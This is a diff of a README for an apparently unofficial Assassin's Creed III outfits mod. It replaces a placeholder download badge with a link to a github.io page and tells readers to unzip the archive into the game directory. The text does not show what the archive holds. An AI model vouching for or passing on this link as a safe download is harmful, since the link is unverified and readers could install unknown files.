@@ -9,7 +9,7 @@ This pack enhances **roleplay, immersion, and replay value**, making Assassin’
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://assassins-creed-ultimate-outfits-pack.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Place the **Ultimate Outfits Pack files** in your Assassin’s Creed III directory.  
